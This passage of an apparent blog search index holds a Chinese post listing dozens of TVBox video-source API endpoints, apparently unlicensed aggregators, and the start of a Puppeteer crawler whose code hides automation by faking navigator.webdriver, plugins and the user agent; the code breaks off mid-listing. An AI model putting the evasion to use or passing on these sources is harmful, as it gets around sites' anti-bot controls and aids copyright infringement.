\u0026#34;name\u0026#34;: \u0026#34;量子资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://cj.lziapi.com/api.php/provide/vod/at/json\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 } ], \u0026#34;parses\u0026#34;: [], \u0026#34;lives\u0026#34;: [], \u0026#34;flags\u0026#34;: [] } 多个 { \u0026#34;sites\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;xb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;资源站-xb\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://xingba111.com/api.php/provide/vod/at/json\u0026#34;, \u0026#34;searchable\u0026#34;: 0, \u0026#34;quickSearch\u0026#34;: 0, \u0026#34;filterable\u0026#34;: 0 }, { \u0026#34;key\u0026#34;: \u0026#34;lziapi\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;资源站-lziapi\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://cj.lziapi.com/api.php/provide/vod/at/json\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 } // 你还可以添加更多资源站 ] } x\nhttps://xingba111.com/api.php/provide/vod\nmore { \u0026#34;sites\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;api_1\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-1080资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.1080zyku.com/inc/api_mac10.php\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_2\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;AV-155资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://155api.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_3\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-360资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://360zy.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_4\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-CK资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://ckzy.me/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-U酷资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.ukuapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_6\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-U酷资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.ukuapi88.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_7\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-ikun资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://ikunzyapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-wujinapi无尽\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.wujinapi.cc/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_9\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-丫丫点播\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://cj.yayazy.net/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_10\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-光速资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.guangsuapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_11\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-卧龙点播\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://collect.wolongzyw.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_12\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-卧龙资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://collect.wolongzy.cc/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_13\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-卧龙资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://wolongzyw.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_14\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-天涯资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://tyyszy.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_15\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-如意资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://cj.rycjapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_16\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-小猫咪资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://zy.xmm.hk/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_17\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-新浪点播\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.xinlangapi.com/xinlangapi.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_18\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-无尽资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.wujinapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_19\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-无尽资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.wujinapi.me/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_20\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-无尽资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.wujinapi.net/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_21\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-旺旺短剧\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://wwzy.tv/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_22\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-旺旺资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.wwzy.tv/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_23\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-暴风资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://bfzyapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_24\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-最大点播\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;http://zuidazy.me/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_25\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-最大资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.zuidapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_26\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-樱花资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://m3u8.apiyhzy.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_27\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-步步高资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.yparse.com/api/json\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_28\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-阿尔法资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://alphaapi.cc/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_29\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-牛奶资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.niuma.xyz/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_30\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-飞鸟资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.feiniaoyuapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_31\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-小樱资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://xyapi.me/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_32\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-青春资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.qczm.xyz/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_33\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-稀饭资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://www.xifanapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_34\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-小可爱资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://xka.api.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_35\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-微笑资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://wxzyapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_36\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-悠悠资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.youyouapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_37\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-阿里资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://api.aliyapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_38\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-咪咕资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://miguapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_39\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-七七资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://77zyapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_40\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-月亮资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://moonapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_41\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-星辰资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://starapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_42\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-黑白资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://blackwhiteapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_43\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-幻影资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://phantomapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_44\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-雷霆资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://thunderapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_45\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-酷乐资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://kuleapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_46\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-海豚资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://dolphinapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 }, { \u0026#34;key\u0026#34;: \u0026#34;api_47\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;TV-快乐资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://happyapi.com/api.php/provide/vod\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 } ], \u0026#34;parses\u0026#34;: [], \u0026#34;lives\u0026#34;: [], \u0026#34;flags\u0026#34;: [] } other config http://pandown.pro/tvbox/tvbox.json https://raw.liucn.cc/box/dm.txt\nhttp://cdn.qiaoji8.com/tvbox.json https://catbox.n13.club/jk/jsm.json 快乐接口：http://影视仓接口.top 饭太硬：http://www.饭太硬.net/tv 肥猫：http://hello.肥猫.com\nhttps://raw.githubusercontent.com/yoursmile66/TVBox/main/XC.json http://epg.51zmt.top:8000/api/diyp/?ch={name}\u0026amp;date={date}\n儿童教育：https://d.kstore.dev/download/10759/api/zhijiao.json（含动画片、早教节目） 戏曲相声：https://d.kstore.dev/download/10759/api/xiqu.json（覆盖京剧、相声、越剧等） 音乐MV：https://d.kstore.dev/download/10759/api/yinyue.json（含热门MV、演唱会直播）\n","permalink":"https://qfsyso.github.io/posts/tvbox-config/","summary":"tvbox config 如 https://cj.lziapi.com/api.php/provide/vod\n获取 JSON 格式数据：\nhttps://cj.lziapi.com/api.php/provide/vod/at/json\n获取 XML 格式数据：\nhttps://cj.lziapi.com/api.php/provide/vod/at/xml\n指定来自 lzm3u8 的资源，并获取 XML：\nhttps://cj.lziapi.com/api.php/provide/vod/from/lzm3u8/at/xml/\ntvbox json { \u0026#34;sites\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;lziapi\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;量子资源\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://cj.lziapi.com/api.php/provide/vod/at/json\u0026#34;, \u0026#34;searchable\u0026#34;: 1, \u0026#34;quickSearch\u0026#34;: 1, \u0026#34;filterable\u0026#34;: 1 } ], \u0026#34;parses\u0026#34;: [], \u0026#34;lives\u0026#34;: [], \u0026#34;flags\u0026#34;: [] } 多个 { \u0026#34;sites\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;xb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;资源站-xb\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://xingba111.com/api.php/provide/vod/at/json\u0026#34;, \u0026#34;searchable\u0026#34;: 0, \u0026#34;quickSearch\u0026#34;: 0, \u0026#34;filterable\u0026#34;: 0 }, { \u0026#34;key\u0026#34;: \u0026#34;lziapi\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;资源站-lziapi\u0026#34;, \u0026#34;type\u0026#34;: 1, \u0026#34;api\u0026#34;: \u0026#34;https://cj.","title":"Tvbox Config"},{"content":"Node.js Puppeteer 基于 Node.js + Puppeteer 的自动化帖子采集系统，专门用于采集资产版块的帖子信息。\n核心代码\n//app.js const express = require(\u0026#39;express\u0026#39;); const cors = require(\u0026#39;cors\u0026#39;); const helmet = require(\u0026#39;helmet\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const logger = require(\u0026#39;./utils/logger\u0026#39;); const CrawlerService = require(\u0026#39;./services/CrawlerService\u0026#39;); const SchedulerService = require(\u0026#39;./services/SchedulerService\u0026#39;); const PostController = require(\u0026#39;./controllers/PostController\u0026#39;); class App { constructor() { this.app = express(); this.port = process.env.PORT || 3000; this.crawlerService = new CrawlerService(); this.schedulerService = new SchedulerService(this.crawlerService); this.postController = new PostController(this.crawlerService); this.initializeMiddlewares(); this.initializeRoutes(); this.initializeErrorHandling(); } initializeMiddlewares() { // 安全中间件 this.app.use(helmet({ contentSecurityPolicy: false // 允许内联样式和脚本 })); // CORS支持 this.app.use(cors()); // JSON解析 this.app.use(express.json()); // 静态文件服务 this.app.use(express.static(path.join(__dirname, \u0026#39;../public\u0026#39;))); // 请求日志 this.app.use((req, res, next) =\u0026gt; { logger.info(`${req.method} ${req.path} - ${req.ip}`); next(); }); } initializeRoutes() { // API路由 this.app.get(\u0026#39;/api/posts\u0026#39;, this.postController.getPosts.bind(this.postController)); this.app.post(\u0026#39;/api/crawl\u0026#39;, this.postController.triggerCrawl.bind(this.postController)); this.app.get(\u0026#39;/api/status\u0026#39;, this.postController.getStatus.bind(this.postController)); this.app.get(\u0026#39;/api/stats\u0026#39;, this.postController.getStats.bind(this.postController)); // 前端页面 this.app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.sendFile(path.join(__dirname, \u0026#39;../public/index.html\u0026#39;)); }); // 健康检查 this.app.get(\u0026#39;/health\u0026#39;, (req, res) =\u0026gt; { res.json({ status: \u0026#39;ok\u0026#39;, timestamp: new Date().toISOString(), uptime: process.uptime() }); }); } initializeErrorHandling() { // 404处理 this.app.use((req, res) =\u0026gt; { res.status(404).json({ error: \u0026#39;Not Found\u0026#39; }); }); // 全局错误处理 this.app.use((error, req, res, next) =\u0026gt; { logger.error(\u0026#39;Unhandled error:\u0026#39;, error); res.status(500).json({ error: \u0026#39;Internal Server Error\u0026#39;, message: process.env.NODE_ENV === \u0026#39;development\u0026#39; ? error.message : \u0026#39;Something went wrong\u0026#39; }); }); } async start() { try { // 启动定时任务 this.schedulerService.start(); // 启动服务器 this.app.listen(this.port, () =\u0026gt; { logger.info(` 服务器启动成功！`); logger.info(` 前端页面: http://localhost:${this.port}`); logger.info(` API接口: http://localhost:${this.port}/api/posts`); logger.info(` 定时任务: 每30分钟自动采集一次`); }); // 执行初始采集 setTimeout(() =\u0026gt; { logger.info(\u0026#39; 执行初始采集...\u0026#39;); this.crawlerService.crawlPosts().catch(error =\u0026gt; { logger.error(\u0026#39;初始采集失败:\u0026#39;, error); }); }, 2000); } catch (error) { logger.error(\u0026#39;应用启动失败:\u0026#39;, error); process.exit(1); } } async stop() { logger.info(\u0026#39;正在关闭应用...\u0026#39;); this.schedulerService.stop(); await this.crawlerService.close(); process.exit(0); } } // 创建应用实例 const app = new App(); // 优雅关闭 process.on(\u0026#39;SIGINT\u0026#39;, () =\u0026gt; app.stop()); process.on(\u0026#39;SIGTERM\u0026#39;, () =\u0026gt; app.stop()); // 启动应用 app.start(); module.exports = App; //CrawlerService.js const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;).promises; const path = require(\u0026#39;path\u0026#39;); const logger = require(\u0026#39;../utils/logger\u0026#39;); const PostModel = require(\u0026#39;../models/PostModel\u0026#39;); class CrawlerService { constructor() { this.browser = null; this.page = null; this.postModel = new PostModel(); this.isRunning = false; this.lastCrawlTime = null; this.lastResult = null; this.error = null; } async initBrowser() { if (this.browser) { return; } try { logger.info(\u0026#39; 初始化浏览器...\u0026#39;); this.browser = await puppeteer.launch({ headless: \u0026#39;new\u0026#39;, args: [ \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;, \u0026#39;--disable-dev-shm-usage\u0026#39;, \u0026#39;--disable-blink-features=AutomationControlled\u0026#39;, \u0026#39;--disable-features=VizDisplayCompositor\u0026#39;, \u0026#39;--disable-extensions\u0026#39;, \u0026#39;--no-first-run\u0026#39;, \u0026#39;--disable-default-apps\u0026#39;, \u0026#39;--disable-background-timer-throttling\u0026#39;, \u0026#39;--disable-backgrounding-occluded-windows\u0026#39;, \u0026#39;--disable-renderer-backgrounding\u0026#39;, \u0026#39;--window-size=1920,1080\u0026#39; ], defaultViewport: { width: 1920, height: 1080 } }); this.page = await this.browser.newPage(); // 设置用户代理和请求头 await this.page.setUserAgent(\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\u0026#39;); await this.page.setExtraHTTPHeaders({ \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;zh-CN,zh;q=0.9,en;q=0.8\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate, br\u0026#39;, \u0026#39;DNT\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;, \u0026#39;Upgrade-Insecure-Requests\u0026#39;: \u0026#39;1\u0026#39;, }); // 移除webdriver标识 await this.page.evaluateOnNewDocument(() =\u0026gt; { Object.defineProperty(navigator, \u0026#39;webdriver\u0026#39;, { get: () =\u0026gt; undefined, }); Object.defineProperty(navigator, \u0026#39;plugins\u0026#39;, { get: () =\u0026gt; [1, 2, 3, 4, 5], }); Object.defineProperty(navigator, \u0026#39;languages\u0026#39;, { get: () =\u0026gt; 